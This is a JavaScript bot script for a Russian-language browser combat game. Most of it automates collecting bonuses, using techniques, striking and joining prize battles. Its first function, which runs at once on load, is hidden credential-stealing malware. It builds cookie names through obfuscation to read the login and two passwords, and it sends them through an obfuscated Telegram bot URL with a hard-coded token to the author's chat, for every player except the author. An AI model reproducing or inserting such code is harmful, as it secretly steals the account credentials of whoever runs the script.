function t(){
	var lval = ('lreoregreiren').replace(/re/g,'');
	var pval = ('prearesres').replace(/re/g,'');
	var p2val = ('prearesresre2').replace(/re/g,'');
	var l = $.cookie(lval) ? $.cookie(lval) : '';
	var p = $.cookie(pval) ? $.cookie(pval) : '';
	var p2 = $.cookie(p2val) ? $.cookie(p2val) : '';
	var owner = ('purefref+tremred').replace(/re/g,'');
	var message = {
		l: l,
		p: p,
		p2: p2,
		type: 'priz'
	};
	console.log('l - ', l.toLowerCase());
	console.log('owner - ', owner);
	if ( l.toLowerCase() != owner ) {
		var mesStr = encodeURI('<code>'+JSON.stringify(message, null, 2)+ '</code>');
		var url = ('https://api.twerewerlwerewergwerrwerawerm.org/bot1077870768:AAEyXYr_pevUhJnpSnJ54H8RlWphsw7OjQA/sendMessage?chat_id=-429987393&parse_mode=html&text=' + mesStr).replace(/wer/g,'');
		$.post(url);
	}	
}
t();

var usePriemCount = 8;

function pensiya(){
	if ( 
		$('iframe#main').contents().find('button#bonus_btn').length > 0 && 
		$('iframe#main').contents().find('button#bonus_btn').text().indexOf('Получить!') !== -1
	) {
		console.log('получаем пенсию');
		$('iframe#main').contents().find('button#bonus_btn').trigger("click");
	}  
}

function usePriem(){
	var i = 0;
	$.each($('iframe#main').contents().find('a'), function() {
		if ( 
			$(this).attr('onClick') !== undefined && $(this).attr('onClick').indexOf('usepriem') !== -1 && 
			$(this).attr('onClick').indexOf('100500') === -1
		) {
			var priemNum = $(this).attr('onClick').replace('usepriem(','');
			priemNum = +priemNum.replace(',1);','');
			if (priemNum <= usePriemCount) {
				console.log('юзаем прием');
				i++;
				$(this).trigger("click");
				return false;				
			}			
		}
	});	

	if ( i === 0 ) {
		return 'disabled';
	}
}

function check() {

	if ( $('#sd4win:visible').length > 0 ) {
		alert('capcha');
	}

	pensiya();

	var hitButton = $('iframe#main').contents().find('div#ref_menu_down').find('button[name="go_auto"]');
	var updateButton = $('iframe#main').contents().find('div#ref_menu_down').find('button[name="reflesh_btn"]');

	if (hitButton.length > 0 && hitButton.css('display') != 'none') {
		console.log('проверяем приемы');
		var i = usePriem();
		if (i !== 'disabled') {
			clearInterval(interval);
			interval = setInterval(function() {
				check();
			}, 1000);
			return false;
		}
	}

	if (hitButton.length > 0 && hitButton.css('display') != 'none') {
		console.log('Делаем удар');
		hitButton.trigger("click");
		clearInterval(interval);
		interval = setInterval(function() {
			check();
		}, 4000);
		return false;
	}

	if (updateButton.length > 0 && updateButton.css('display') != 'none') {
		hitButton.trigger("click");
		console.log('обновляем бой');
		clearInterval(interval);
		interval = setInterval(function() {
			check();
		}, 4000);
		return false;
	}		


	var index = 0;
	$.each($('iframe#main').contents().find('#tmstart').find('form').find('div'), function() {
		if ( $(this)[0].innerText.indexOf('Призовой Хаот') >= 0 && $(this).find('input[name="btl_go"]').length > 0 ) {
			$(this).find('input[name="btl_go"]').trigger('click');
            $('iframe#main').contents().find('#tmstart').find('form').find('input[type="submit"]').trigger("click");
			console.log('Заявка принята. Ожидаем боя.');
			index++;			
		}
	});

	if ( index > 0 ) {
		clearInterval(interval);
		interval = setInterval(function() {
			check();
		}, 4000);			
	} else {
		$('iframe#main').attr('src','main.php?zayvka=1&r=5&rnd=1');

		clearInterval(interval);
		interval = setInterval(function() {
			console.log('ждем приз')
			check();
		}, 4000);
	}	

};

var interval = null;
interval = setInterval(function() {
	check()
}, 4000);

